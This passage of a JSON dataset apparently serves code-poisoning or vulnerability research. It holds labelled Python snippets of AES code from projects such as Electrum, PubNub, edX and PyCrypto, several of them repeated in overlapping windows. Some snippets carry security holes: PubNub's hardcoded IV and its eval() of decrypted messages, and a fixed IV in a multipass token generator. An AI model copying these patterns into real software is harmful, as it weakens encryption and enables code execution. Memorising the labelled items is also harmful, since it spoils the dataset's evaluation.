      "        If False (default), in big endian format.\n",
      "      allow_wraparound : boolean\n",
      "        If True, the function will raise an *OverflowError* exception as soon\n",
      "        as the counter wraps around. If False (default), the counter will\n",
      "        simply restart from zero.\n"
    ],
    "target": 40,
    "len": 3
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/devs1991/test_edx_docmode/venv/lib/python2.7/site-packages/Crypto/Random/Fortuna/FortunaGenerator.py",
    "code": [
      "    # collision for every 2**64 blocks of output from a real random source.\n",
      "    # However, this code generates pseudorandom data by running AES in\n",
      "    # counter mode, so there will be no collisions until the counter\n",
      "    # (theoretically) wraps around at 2**128 blocks.  Thus, in order to prevent\n",
      "    # Fortuna's pseudorandom output from deviating perceptibly from a true\n",
      "    # random source, Ferguson and Schneier specify a limit of 2**16 blocks\n",
      "    # without rekeying.\n",
      "    max_blocks_per_request = 2**16  # Allow no more than this number of blocks per _pseudo_random_data request\n",
      "\n",
      "    _four_kiblocks_of_zeros = b(\"\\0\") * block_size * 4096\n",
      "\n",
      "    def __init__(self):\n",
      "        self.counter = Counter.new(nbits=self.block_size*8, initial_value=0, little_endian=True)\n",
      "        self.key = None\n",
      "\n",
      "        # Set some helper constants\n",
      "        self.block_size_shift = exact_log2(self.block_size)\n",
      "        assert (1 << self.block_size_shift) == self.block_size\n",
      "\n",
      "        self.blocks_per_key = exact_div(self.key_size, self.block_size)\n",
      "        assert self.key_size == self.blocks_per_key * self.block_size\n",
      "\n",
      "        self.max_bytes_per_request = self.max_blocks_per_request * self.block_size\n",
      "\n",
      "    def reseed(self, seed):\n",
      "        if self.key is None:\n",
      "            self.key = b(\"\\0\") * self.key_size\n",
      "\n",
      "        self._set_key(SHAd256.new(self.key + seed).digest())\n",
      "        self.counter()  # increment counter\n",
      "        assert len(self.key) == self.key_size\n",
      "\n",
      "    def pseudo_random_data(self, bytes):\n",
      "        assert bytes >= 0\n",
      "\n",
      "        num_full_blocks = bytes >> 20\n",
      "        remainder = bytes & ((1<<20)-1)\n",
      "\n",
      "        retval = []\n",
      "        for i in xrange(num_full_blocks):\n",
      "            retval.append(self._pseudo_random_data(1<<20))\n",
      "        retval.append(self._pseudo_random_data(remainder))\n",
      "        \n",
      "        return b(\"\").join(retval)  \n",
      "\n",
      "    def _set_key(self, key):\n",
      "        self.key = key\n",
      "        self._cipher = AES.new(key, AES.MODE_CTR, counter=self.counter)\n",
      "\n",
      "    def _pseudo_random_data(self, bytes):\n",
      "        if not (0 <= bytes <= self.max_bytes_per_request):\n",
      "            raise AssertionError(\"You cannot ask for more than 1 MiB of data per request\")\n",
      "\n",
      "        num_blocks = ceil_shift(bytes, self.block_size_shift)   # num_blocks = ceil(bytes / self.block_size)\n",
      "\n",
      "        # Compute the output\n",
      "        retval = self._generate_blocks(num_blocks)[:bytes]\n",
      "\n",
      "        # Switch to a new key to avoid later compromises of this output (i.e.\n",
      "        # state compromise extension attacks)\n",
      "        self._set_key(self._generate_blocks(self.blocks_per_key))\n",
      "\n",
      "        assert len(retval) == bytes\n",
      "        assert len(self.key) == self.key_size\n",
      "\n",
      "        return retval\n",
      "\n",
      "    def _generate_blocks(self, num_blocks):\n",
      "        if self.key is None:\n",
      "            raise AssertionError(\"generator must be seeded before use\")\n",
      "        assert 0 <= num_blocks <= self.max_blocks_per_request\n",
      "        retval = []\n",
      "        for i in xrange(num_blocks >> 12):      # xrange(num_blocks / 4096)\n",
      "            retval.append(self._cipher.encrypt(self._four_kiblocks_of_zeros))\n",
      "        remaining_bytes = (num_blocks & 4095) << self.block_size_shift  # (num_blocks % 4095) * self.block_size\n",
      "        retval.append(self._cipher.encrypt(self._four_kiblocks_of_zeros[:remaining_bytes]))\n",
      "        return b(\"\").join(retval)\n",
      "\n",
      "# vim:set ts=4 sw=4 sts=4 expandtab:"
    ],
    "target": 46,
    "len": 3
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/bueda/django-comrade/comrade/users/multipass.py",
    "code": [
      "\"\"\"\n",
      "Generate multipass for single sign-on with Tender.\n",
      "\n",
      "Requires TENDER_API KEY and TENDER_ACCOUNT_KEY to be in the app settings.py.\n",
      "\"\"\"\n",
      "from django.conf import settings\n",
      "\n",
      "import base64\n",
      "import hashlib\n",
      "import urllib\n",
      "import operator\n",
      "import array\n",
      "import simplejson\n",
      "from Crypto.Cipher import AES\n",
      "from datetime import datetime, timedelta\n",
      "\n",
      "import commonware.log\n",
      "logger = commonware.log.getLogger(__name__)\n",
      "\n",
      "def multipass(user):\n",
      "    if (not hasattr(settings, 'TENDER_API_KEY')\n",
      "            and hasattr(settings, 'TENDER_ACCOUNT_KEY')):\n",
      "        logger.warning('No TENDER_API_KEY or TENDER_ACCOUNT_KEY defined in'\n",
      "                'settings -- unable to generate multipass key')\n",
      "        return\n",
      "\n",
      "    expires = datetime.utcnow() + timedelta(minutes=5)\n",
      "\n",
      "    message = {\n",
      "        \"unique_id\" : user.id,\n",
      "        \"expires\" : expires.isoformat(),\n",
      "        \"display_name\" : user.get_full_name(),\n",
      "        \"email\" : user.email\n",
      "    }\n",
      "    block_size = 16\n",
      "    mode = AES.MODE_CBC\n",
      "\n",
      "    iv = \"OpenSSL for Ruby\"\n",
      "    json = simplejson.dumps(message, separators=(',',':'))\n",
      "    salted = settings.TENDER_API_KEY + settings.TENDER_ACCOUNT_KEY\n",
      "    saltedHash = hashlib.sha1(salted).digest()[:16]\n",
      "\n",
      "    json_bytes = array.array('b', json[0 : len(json)])\n",
      "    iv_bytes = array.array('b', iv[0 : len(iv)])\n",
      "\n",
      "    # xor the iv into the first 16 bytes.\n",
      "    for i in range(0, 16):\n",
      "        json_bytes[i] = operator.xor(json_bytes[i], iv_bytes[i])\n",
      "\n",
      "    pad = block_size - len(json_bytes.tostring()) % block_size\n",
      "    data = json_bytes.tostring() + pad * chr(pad)\n",
      "    aes = AES.new(saltedHash, mode, iv)\n",
      "    encrypted_bytes = aes.encrypt(data)\n",
      "\n",
      "    return urllib.quote(base64.b64encode(encrypted_bytes))\n"
    ],
    "target": 35,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/thepwagner/flotilla/src/flotilla/client/db.py",
    "code": [
      "\n",
      "        service_item[rev_hash] = revision.weight\n",
      "        service_item.partial_save()\n",
      "\n",
      "    def _store_revision(self, revision, key):\n",
      "        # Store units:\n",
      "        with self._units.batch_write() as batch:\n",
      "            for unit in revision.units:\n",
      "                unit_hash = unit.unit_hash\n",
      "                if self._units.has_item(unit_hash=unit_hash):\n",
      "                    logger.debug('Unit %s exists.', unit_hash)\n",
      "                    continue\n",
      "\n",
      "                logger.debug('Adding unit %s.', unit_hash)\n",
      "                unit_item = self._units.new_item(unit_hash)\n",
      "                unit_item['name'] = unit.name\n",
      "                unit_item['unit_file'] = unit.unit_file\n",
      "                env = unit.environment\n",
      "                if env:\n",
      "                    if key:\n",
      "                        self._encrypt_environment(key, env, unit_item)\n",
      "                    else:\n",
      "                        unit_item['environment'] = env\n",
      "                batch.put_item(data=unit_item)\n",
      "\n",
      "        # Link units to revision + label:\n",
      "        rev_hash = revision.revision_hash\n",
      "        if not self._revisions.has_item(rev_hash=rev_hash):\n",
      "            rev_item = self._revisions.new_item(rev_hash)\n",
      "            rev_item['label'] = revision.label\n",
      "            rev_item['units'] = [unit.unit_hash for unit in revision.units]\n",
      "            rev_item.save()\n",
      "\n",
      "        return rev_hash\n",
      "\n",
      "    def _encrypt_environment(self, key_id, environment, unit_item):\n",
      "        kms_key = self._kms.generate_data_key(key_id, key_spec='AES_256')\n",
      "        plaintext_key = kms_key['Plaintext']\n",
      "        encrypted_key = kms_key['CiphertextBlob']\n",
      "\n",
      "        iv = Random.new().read(AES.block_size)\n",
      "        cipher = AES.new(plaintext_key, AES.MODE_CBC, iv)\n",
      "        environment_json = json.dumps(environment)\n",
      "        environment_encrypted = cipher.encrypt(aes_pad(environment_json))\n",
      "\n",
      "        unit_item['environment_iv'] = iv.encode('base64')\n",
      "        unit_item['environment_key'] = encrypted_key.encode('base64')\n",
      "        unit_item['environment_data'] = environment_encrypted.encode('base64')\n",
      "\n",
      "    def del_revision(self, service, rev_hash):\n",
      "        try:\n",
      "            service_item = self._services.get_item(service_name=service)\n",
      "            if rev_hash in service_item:\n",
      "                del service_item[rev_hash]\n",
      "                service_item.partial_save()\n",
      "        except ItemNotFound:\n",
      "            logger.warning('Service %s not found, unable to delete %s', service,\n",
      "                           rev_hash)\n",
      "\n",
      "        try:\n",
      "            rev_item = self._revisions.get_item(rev_hash=rev_hash)\n",
      "            rev_item.delete()\n",
      "        except ItemNotFound:\n",
      "            logger.warning('Revision %s not found, unable to delete', rev_hash)\n",
      "\n",
      "    def set_revision_weight(self, service, rev_hash, weight):\n",
      "        try:\n",
      "            service_item = self._services.get_item(service_name=service)\n",
      "            service_item[rev_hash] = weight\n",
      "            service_item.partial_save()\n",
      "        except ItemNotFound:\n",
      "            logger.warn('Service %s not found, unable to set weight of %s',\n",
      "                        service, rev_hash)\n",
      "\n",
      "    def get_revisions(self, service):\n",
      "        try:\n",
      "            service_item = self._services.get_item(service_name=service)\n",
      "        except ItemNotFound:\n",
      "            return []\n",
      "\n",
      "        # Select revisions and build weight-only return values:\n",
      "        rev_hashes = [k for k in service_item.keys() if k != 'service_name']\n",
      "        logger.debug('Found %d revisions in %s.', len(rev_hashes), service)\n"
    ],
    "target": 40,
    "len": 3
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/asfin/electrum/electrum/crypto.py",
    "code": [
      "import hashlib\n",
      "import hmac\n",
      "\n",
      "import pyaes\n",
      "\n",
      "from .util import assert_bytes, InvalidPassword, to_bytes, to_string\n",
      "\n",
      "\n",
      "try:\n",
      "    from Cryptodome.Cipher import AES\n",
      "except:\n",
      "    AES = None\n",
      "\n",
      "\n",
      "class InvalidPadding(Exception):\n",
      "    pass\n",
      "\n",
      "\n",
      "def append_PKCS7_padding(data):\n",
      "    assert_bytes(data)\n",
      "    padlen = 16 - (len(data) % 16)\n",
      "    return data + bytes([padlen]) * padlen\n",
      "\n",
      "\n",
      "def strip_PKCS7_padding(data):\n",
      "    assert_bytes(data)\n",
      "    if len(data) % 16 != 0 or len(data) == 0:\n",
      "        raise InvalidPadding(\"invalid length\")\n",
      "    padlen = data[-1]\n",
      "    if padlen > 16:\n",
      "        raise InvalidPadding(\"invalid padding byte (large)\")\n",
      "    for i in data[-padlen:]:\n",
      "        if i != padlen:\n",
      "            raise InvalidPadding(\"invalid padding byte (inconsistent)\")\n",
      "    return data[0:-padlen]\n",
      "\n",
      "\n",
      "def aes_encrypt_with_iv(key, iv, data):\n",
      "    assert_bytes(key, iv, data)\n",
      "    data = append_PKCS7_padding(data)\n",
      "    if AES:\n",
      "        e = AES.new(key, AES.MODE_CBC, iv).encrypt(data)\n",
      "    else:\n",
      "        aes_cbc = pyaes.AESModeOfOperationCBC(key, iv=iv)\n",
      "        aes = pyaes.Encrypter(aes_cbc, padding=pyaes.PADDING_NONE)\n",
      "        e = aes.feed(data) + aes.feed()  # empty aes.feed() flushes buffer\n",
      "    return e\n",
      "\n",
      "\n",
      "def aes_decrypt_with_iv(key, iv, data):\n",
      "    assert_bytes(key, iv, data)\n",
      "    if AES:\n",
      "        cipher = AES.new(key, AES.MODE_CBC, iv)\n",
      "        data = cipher.decrypt(data)\n",
      "    else:\n",
      "        aes_cbc = pyaes.AESModeOfOperationCBC(key, iv=iv)\n",
      "        aes = pyaes.Decrypter(aes_cbc, padding=pyaes.PADDING_NONE)\n",
      "        data = aes.feed(data) + aes.feed()  # empty aes.feed() flushes buffer\n",
      "    try:\n",
      "        return strip_PKCS7_padding(data)\n",
      "    except InvalidPadding:\n",
      "        raise InvalidPassword()\n",
      "\n",
      "\n",
      "def EncodeAES(secret, s):\n",
      "    assert_bytes(s)\n",
      "    iv = bytes(os.urandom(16))\n",
      "    ct = aes_encrypt_with_iv(secret, iv, s)\n",
      "    e = iv + ct\n",
      "    return base64.b64encode(e)\n",
      "\n",
      "def DecodeAES(secret, e):\n",
      "    e = bytes(base64.b64decode(e))\n",
      "    iv, e = e[:16], e[16:]\n",
      "    s = aes_decrypt_with_iv(secret, iv, e)\n",
      "    return s\n",
      "\n",
      "def pw_encode(s, password):\n",
      "    if password:\n",
      "        secret = Hash(password)\n",
      "        return EncodeAES(secret, to_bytes(s, \"utf8\")).decode('utf8')\n",
      "    else:\n",
      "        return s\n"
    ],
    "target": 40,
    "len": 3
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/asfin/electrum/electrum/crypto.py",
    "code": [
      "    pass\n",
      "\n",
      "\n",
      "def append_PKCS7_padding(data):\n",
      "    assert_bytes(data)\n",
      "    padlen = 16 - (len(data) % 16)\n",
      "    return data + bytes([padlen]) * padlen\n",
      "\n",
      "\n",
      "def strip_PKCS7_padding(data):\n",
      "    assert_bytes(data)\n",
      "    if len(data) % 16 != 0 or len(data) == 0:\n",
      "        raise InvalidPadding(\"invalid length\")\n",
      "    padlen = data[-1]\n",
      "    if padlen > 16:\n",
      "        raise InvalidPadding(\"invalid padding byte (large)\")\n",
      "    for i in data[-padlen:]:\n",
      "        if i != padlen:\n",
      "            raise InvalidPadding(\"invalid padding byte (inconsistent)\")\n",
      "    return data[0:-padlen]\n",
      "\n",
      "\n",
      "def aes_encrypt_with_iv(key, iv, data):\n",
      "    assert_bytes(key, iv, data)\n",
      "    data = append_PKCS7_padding(data)\n",
      "    if AES:\n",
      "        e = AES.new(key, AES.MODE_CBC, iv).encrypt(data)\n",
      "    else:\n",
      "        aes_cbc = pyaes.AESModeOfOperationCBC(key, iv=iv)\n",
      "        aes = pyaes.Encrypter(aes_cbc, padding=pyaes.PADDING_NONE)\n",
      "        e = aes.feed(data) + aes.feed()  # empty aes.feed() flushes buffer\n",
      "    return e\n",
      "\n",
      "\n",
      "def aes_decrypt_with_iv(key, iv, data):\n",
      "    assert_bytes(key, iv, data)\n",
      "    if AES:\n",
      "        cipher = AES.new(key, AES.MODE_CBC, iv)\n",
      "        data = cipher.decrypt(data)\n",
      "    else:\n",
      "        aes_cbc = pyaes.AESModeOfOperationCBC(key, iv=iv)\n",
      "        aes = pyaes.Decrypter(aes_cbc, padding=pyaes.PADDING_NONE)\n",
      "        data = aes.feed(data) + aes.feed()  # empty aes.feed() flushes buffer\n",
      "    try:\n",
      "        return strip_PKCS7_padding(data)\n",
      "    except InvalidPadding:\n",
      "        raise InvalidPassword()\n",
      "\n",
      "\n",
      "def EncodeAES(secret, s):\n",
      "    assert_bytes(s)\n",
      "    iv = bytes(os.urandom(16))\n",
      "    ct = aes_encrypt_with_iv(secret, iv, s)\n",
      "    e = iv + ct\n",
      "    return base64.b64encode(e)\n",
      "\n",
      "def DecodeAES(secret, e):\n",
      "    e = bytes(base64.b64decode(e))\n",
      "    iv, e = e[:16], e[16:]\n",
      "    s = aes_decrypt_with_iv(secret, iv, e)\n",
      "    return s\n",
      "\n",
      "def pw_encode(s, password):\n",
      "    if password:\n",
      "        secret = Hash(password)\n",
      "        return EncodeAES(secret, to_bytes(s, \"utf8\")).decode('utf8')\n",
      "    else:\n",
      "        return s\n",
      "\n",
      "def pw_decode(s, password):\n",
      "    if password is not None:\n",
      "        secret = Hash(password)\n",
      "        try:\n",
      "            d = to_string(DecodeAES(secret, s), \"utf8\")\n",
      "        except Exception:\n",
      "            raise InvalidPassword()\n",
      "        return d\n",
      "    else:\n",
      "        return s\n"
    ],
    "target": 36,
    "len": 3
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/vivek8943/python/pubnub.py",
    "code": [
      "        def __init__(self, finished):\n",
      "            self.finished = finished\n",
      "\n",
      "        def dataReceived(self, bytes):\n",
      "            self.finished.callback(bytes)\n",
      "except ImportError:\n",
      "    pass\n",
      "\n",
      "\n",
      "#######################################\n",
      "\n",
      "\n",
      "def get_data_for_user(data):\n",
      "    try:\n",
      "        if 'message' in data and 'payload' in data:\n",
      "            return {'message': data['message'], 'payload': data['payload']}\n",
      "        else:\n",
      "            return data\n",
      "    except TypeError:\n",
      "        return data\n",
      "\n",
      "\n",
      "class PubnubCrypto2():\n",
      "\n",
      "    def pad(self, msg, block_size=16):\n",
      "\n",
      "        padding = block_size - (len(msg) % block_size)\n",
      "        return msg + chr(padding) * padding\n",
      "\n",
      "    def depad(self, msg):\n",
      "\n",
      "        return msg[0:-ord(msg[-1])]\n",
      "\n",
      "    def getSecret(self, key):\n",
      "\n",
      "        return hashlib.sha256(key).hexdigest()\n",
      "\n",
      "    def encrypt(self, key, msg):\n",
      "        secret = self.getSecret(key)\n",
      "        Initial16bytes = '0123456789012345'\n",
      "        cipher = AES.new(secret[0:32], AES.MODE_CBC, Initial16bytes)\n",
      "        enc = encodestring(cipher.encrypt(self.pad(msg)))\n",
      "        return enc\n",
      "\n",
      "    def decrypt(self, key, msg):\n",
      "\n",
      "        try:\n",
      "            secret = self.getSecret(key)\n",
      "            Initial16bytes = '0123456789012345'\n",
      "            cipher = AES.new(secret[0:32], AES.MODE_CBC, Initial16bytes)\n",
      "            plain = self.depad(cipher.decrypt(decodestring(msg)))\n",
      "        except:\n",
      "            return msg\n",
      "        try:\n",
      "            return eval(plain)\n",
      "        except SyntaxError:\n",
      "            return plain\n",
      "\n",
      "class PubnubCrypto3():\n",
      "\n",
      "    def pad(self, msg, block_size=16):\n",
      "\n",
      "        padding = block_size - (len(msg) % block_size)\n",
      "        return msg + (chr(padding) * padding).encode('utf-8')\n",
      "\n",
      "    def depad(self, msg):\n",
      "\n",
      "        return msg[0:-ord(msg[-1])]\n",
      "\n",
      "    def getSecret(self, key):\n",
      "\n",
      "        return hashlib.sha256(key.encode(\"utf-8\")).hexdigest()\n",
      "\n",
      "    def encrypt(self, key, msg):\n",
      "\n",
      "        secret = self.getSecret(key)\n",
      "        Initial16bytes = '0123456789012345'\n",
      "        cipher = AES.new(secret[0:32], AES.MODE_CBC, Initial16bytes)\n",
      "        return encodestring(\n",
      "            cipher.encrypt(self.pad(msg.encode('utf-8')))).decode('utf-8')\n",
      "\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/vivek8943/python/pubnub.py",
    "code": [
      "#######################################\n",
      "\n",
      "\n",
      "def get_data_for_user(data):\n",
      "    try:\n",
      "        if 'message' in data and 'payload' in data:\n",
      "            return {'message': data['message'], 'payload': data['payload']}\n",
      "        else:\n",
      "            return data\n",
      "    except TypeError:\n",
      "        return data\n",
      "\n",
      "\n",
      "class PubnubCrypto2():\n",
      "\n",
      "    def pad(self, msg, block_size=16):\n",
      "\n",
      "        padding = block_size - (len(msg) % block_size)\n",
      "        return msg + chr(padding) * padding\n",
      "\n",
      "    def depad(self, msg):\n",
      "\n",
      "        return msg[0:-ord(msg[-1])]\n",
      "\n",
      "    def getSecret(self, key):\n",
      "\n",
      "        return hashlib.sha256(key).hexdigest()\n",
      "\n",
      "    def encrypt(self, key, msg):\n",
      "        secret = self.getSecret(key)\n",
      "        Initial16bytes = '0123456789012345'\n",
      "        cipher = AES.new(secret[0:32], AES.MODE_CBC, Initial16bytes)\n",
      "        enc = encodestring(cipher.encrypt(self.pad(msg)))\n",
      "        return enc\n",
      "\n",
      "    def decrypt(self, key, msg):\n",
      "\n",
      "        try:\n",
      "            secret = self.getSecret(key)\n",
      "            Initial16bytes = '0123456789012345'\n",
      "            cipher = AES.new(secret[0:32], AES.MODE_CBC, Initial16bytes)\n",
      "            plain = self.depad(cipher.decrypt(decodestring(msg)))\n",
      "        except:\n",
      "            return msg\n",
      "        try:\n",
      "            return eval(plain)\n",
      "        except SyntaxError:\n",
      "            return plain\n",
      "\n",
      "class PubnubCrypto3():\n",
      "\n",
      "    def pad(self, msg, block_size=16):\n",
      "\n",
      "        padding = block_size - (len(msg) % block_size)\n",
      "        return msg + (chr(padding) * padding).encode('utf-8')\n",
      "\n",
      "    def depad(self, msg):\n",
      "\n",
      "        return msg[0:-ord(msg[-1])]\n",
      "\n",
      "    def getSecret(self, key):\n",
      "\n",
      "        return hashlib.sha256(key.encode(\"utf-8\")).hexdigest()\n",
      "\n",
      "    def encrypt(self, key, msg):\n",
      "\n",
      "        secret = self.getSecret(key)\n",
      "        Initial16bytes = '0123456789012345'\n",
      "        cipher = AES.new(secret[0:32], AES.MODE_CBC, Initial16bytes)\n",
      "        return encodestring(\n",
      "            cipher.encrypt(self.pad(msg.encode('utf-8')))).decode('utf-8')\n",
      "\n",
      "    def decrypt(self, key, msg):\n",
      "\n",
      "        secret = self.getSecret(key)\n",
      "        Initial16bytes = '0123456789012345'\n",
      "        cipher = AES.new(secret[0:32], AES.MODE_CBC, Initial16bytes)\n",
      "        return (cipher.decrypt(\n",
      "            decodestring(msg.encode('utf-8')))).decode('utf-8')\n",
      "\n",
      "\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/vivek8943/python/pubnub.py",
    "code": [
      "    def encrypt(self, key, msg):\n",
      "        secret = self.getSecret(key)\n",
      "        Initial16bytes = '0123456789012345'\n",
      "        cipher = AES.new(secret[0:32], AES.MODE_CBC, Initial16bytes)\n",
      "        enc = encodestring(cipher.encrypt(self.pad(msg)))\n",
      "        return enc\n",
      "\n",
      "    def decrypt(self, key, msg):\n",
      "\n",
      "        try:\n",
      "            secret = self.getSecret(key)\n",
      "            Initial16bytes = '0123456789012345'\n",
      "            cipher = AES.new(secret[0:32], AES.MODE_CBC, Initial16bytes)\n",
      "            plain = self.depad(cipher.decrypt(decodestring(msg)))\n",
      "        except:\n",
      "            return msg\n",
      "        try:\n",
      "            return eval(plain)\n",
      "        except SyntaxError:\n",
      "            return plain\n",
      "\n",
      "class PubnubCrypto3():\n",
      "\n",
      "    def pad(self, msg, block_size=16):\n",
      "\n",
      "        padding = block_size - (len(msg) % block_size)\n",
      "        return msg + (chr(padding) * padding).encode('utf-8')\n",
      "\n",
      "    def depad(self, msg):\n",
      "\n",
      "        return msg[0:-ord(msg[-1])]\n",
      "\n",
      "    def getSecret(self, key):\n",
      "\n",
      "        return hashlib.sha256(key.encode(\"utf-8\")).hexdigest()\n",
      "\n",
      "    def encrypt(self, key, msg):\n",
      "\n",
      "        secret = self.getSecret(key)\n",
      "        Initial16bytes = '0123456789012345'\n",
      "        cipher = AES.new(secret[0:32], AES.MODE_CBC, Initial16bytes)\n",
      "        return encodestring(\n",
      "            cipher.encrypt(self.pad(msg.encode('utf-8')))).decode('utf-8')\n",
      "\n",
      "    def decrypt(self, key, msg):\n",
      "\n",
      "        secret = self.getSecret(key)\n",
      "        Initial16bytes = '0123456789012345'\n",
      "        cipher = AES.new(secret[0:32], AES.MODE_CBC, Initial16bytes)\n",
      "        return (cipher.decrypt(\n",
      "            decodestring(msg.encode('utf-8')))).decode('utf-8')\n",
      "\n",
      "\n",
      "class PubnubBase(object):\n",
      "    def __init__(\n",
      "        self,\n",
      "        publish_key,\n",
      "        subscribe_key,\n",
      "        secret_key=False,\n",
      "        cipher_key=False,\n",
      "        auth_key=None,\n",
      "        ssl_on=False,\n",
      "        origin='pubsub.pubnub.com',\n",
      "        uuid=None\n",
      "    ):\n",
      "        \"\"\"Pubnub Class\n",
      "\n",
      "        Provides methods to communicate with Pubnub cloud\n",
      "\n",
      "        Attributes:\n",
      "            publish_key: Publish Key\n",
      "            subscribe_key: Subscribe Key\n",
      "            secret_key: Secret Key\n",
      "            cipher_key: Cipher Key\n",
      "            auth_key: Auth Key (used with Pubnub Access Manager i.e. PAM)\n",
      "            ssl: SSL enabled ? \n",
      "            origin: Origin\n",
      "        \"\"\"\n",
      "\n",
      "        self.origin = origin\n",
      "        self.version = '3.7.2'\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/vivek8943/python/pubnub.py",
    "code": [
      "\n",
      "        try:\n",
      "            secret = self.getSecret(key)\n",
      "            Initial16bytes = '0123456789012345'\n",
      "            cipher = AES.new(secret[0:32], AES.MODE_CBC, Initial16bytes)\n",
      "            plain = self.depad(cipher.decrypt(decodestring(msg)))\n",
      "        except:\n",
      "            return msg\n",
      "        try:\n",
      "            return eval(plain)\n",
      "        except SyntaxError:\n",
      "            return plain\n",
      "\n",
      "class PubnubCrypto3():\n",
      "\n",
      "    def pad(self, msg, block_size=16):\n",
      "\n",
      "        padding = block_size - (len(msg) % block_size)\n",
      "        return msg + (chr(padding) * padding).encode('utf-8')\n",
      "\n",
      "    def depad(self, msg):\n",
      "\n",
      "        return msg[0:-ord(msg[-1])]\n",
      "\n",
      "    def getSecret(self, key):\n",
      "\n",
      "        return hashlib.sha256(key.encode(\"utf-8\")).hexdigest()\n",
      "\n",
      "    def encrypt(self, key, msg):\n",
      "\n",
      "        secret = self.getSecret(key)\n",
      "        Initial16bytes = '0123456789012345'\n",
      "        cipher = AES.new(secret[0:32], AES.MODE_CBC, Initial16bytes)\n",
      "        return encodestring(\n",
      "            cipher.encrypt(self.pad(msg.encode('utf-8')))).decode('utf-8')\n",
      "\n",
      "    def decrypt(self, key, msg):\n",
      "\n",
      "        secret = self.getSecret(key)\n",
      "        Initial16bytes = '0123456789012345'\n",
      "        cipher = AES.new(secret[0:32], AES.MODE_CBC, Initial16bytes)\n",
      "        return (cipher.decrypt(\n",
      "            decodestring(msg.encode('utf-8')))).decode('utf-8')\n",
      "\n",
      "\n",
      "class PubnubBase(object):\n",
      "    def __init__(\n",
      "        self,\n",
      "        publish_key,\n",
      "        subscribe_key,\n",
      "        secret_key=False,\n",
      "        cipher_key=False,\n",
      "        auth_key=None,\n",
      "        ssl_on=False,\n",
      "        origin='pubsub.pubnub.com',\n",
      "        uuid=None\n",
      "    ):\n",
      "        \"\"\"Pubnub Class\n",
      "\n",
      "        Provides methods to communicate with Pubnub cloud\n",
      "\n",
      "        Attributes:\n",
      "            publish_key: Publish Key\n",
      "            subscribe_key: Subscribe Key\n",
      "            secret_key: Secret Key\n",
      "            cipher_key: Cipher Key\n",
      "            auth_key: Auth Key (used with Pubnub Access Manager i.e. PAM)\n",
      "            ssl: SSL enabled ? \n",
      "            origin: Origin\n",
      "        \"\"\"\n",
      "\n",
      "        self.origin = origin\n",
      "        self.version = '3.7.2'\n",
      "        self.limit = 1800\n",
      "        self.publish_key = publish_key\n",
      "        self.subscribe_key = subscribe_key\n",
      "        self.secret_key = secret_key\n",
      "        self.cipher_key = cipher_key\n",
      "        self.ssl = ssl_on\n",
      "        self.auth_key = auth_key\n",
      "        self.STATE = {}\n"
    ],
    "target": 40,
    "len": 1
  },
  {
    "file_path": "/home/jiangyc/project/PoisoningDataset/data/EM/valid/bigdatauniversity/edx-platform/lms/djangoapps/notification_prefs/views.py",
    "code": [
      "from django.conf import settings\n",
      "from django.contrib.auth.models import User\n",
      "from django.core.exceptions import PermissionDenied\n",
      "from django.http import Http404, HttpResponse\n",
      "from django.views.decorators.http import require_GET, require_POST\n",
      "\n",
      "from edxmako.shortcuts import render_to_response\n",
      "from notification_prefs import NOTIFICATION_PREF_KEY\n",
      "from openedx.core.djangoapps.user_api.models import UserPreference\n",
      "from openedx.core.djangoapps.user_api.preferences.api import delete_user_preference\n",
      "\n",
      "\n",
      "class UsernameDecryptionException(Exception):\n",
      "    pass\n",
      "\n",
      "\n",
      "class UsernameCipher(object):\n",
      "    \"\"\"\n",
      "    A transformation of a username to/from an opaque token\n",
      "\n",
      "    The purpose of the token is to make one-click unsubscribe links that don't\n",
      "    require the user to log in. To prevent users from unsubscribing other users,\n",
      "    we must ensure the token cannot be computed by anyone who has this\n",
      "    source code. The token must also be embeddable in a URL.\n",
      "\n",
      "    Thus, we take the following steps to encode (and do the inverse to decode):\n",
      "    1. Pad the UTF-8 encoding of the username with PKCS#7 padding to match the\n",
      "       AES block length\n",
      "    2. Generate a random AES block length initialization vector\n",
      "    3. Use AES-256 (with a hash of settings.SECRET_KEY as the encryption key)\n",
      "       in CBC mode to encrypt the username\n",
      "    4. Prepend the IV to the encrypted value to allow for initialization of the\n",
      "       decryption cipher\n",
      "    5. base64url encode the result\n",
      "    \"\"\"\n",
      "\n",
      "    @staticmethod\n",
      "    def _get_aes_cipher(initialization_vector):\n",
      "        hash_ = sha256()\n",
      "        hash_.update(settings.SECRET_KEY)\n",
      "        return AES.new(hash_.digest(), AES.MODE_CBC, initialization_vector)\n",
      "\n",
      "    @staticmethod\n",
      "    def _add_padding(input_str):\n",
      "        \"\"\"Return `input_str` with PKCS#7 padding added to match AES block length\"\"\"\n",
      "        padding_len = AES.block_size - len(input_str) % AES.block_size\n",
      "        return input_str + padding_len * chr(padding_len)\n",
      "\n",
      "    @staticmethod\n",
      "    def _remove_padding(input_str):\n",
      "        \"\"\"Return `input_str` with PKCS#7 padding trimmed to match AES block length\"\"\"\n",
      "        num_pad_bytes = ord(input_str[-1])\n",
      "        if num_pad_bytes < 1 or num_pad_bytes > AES.block_size or num_pad_bytes >= len(input_str):\n",
      "            raise UsernameDecryptionException(\"padding\")\n",
      "        return input_str[:-num_pad_bytes]\n",
      "\n",
      "    @staticmethod\n",
      "    def encrypt(username):\n",
      "        initialization_vector = Random.new().read(AES.block_size)\n",
      "        aes_cipher = UsernameCipher._get_aes_cipher(initialization_vector)\n",
      "        return urlsafe_b64encode(\n",
      "            initialization_vector +\n",
      "            aes_cipher.encrypt(UsernameCipher._add_padding(username.encode(\"utf-8\")))\n",
      "        )\n",
      "\n",
      "    @staticmethod\n",
      "    def decrypt(token):\n",
      "        try:\n",
      "            base64_decoded = urlsafe_b64decode(token)\n",
      "        except TypeError:\n",
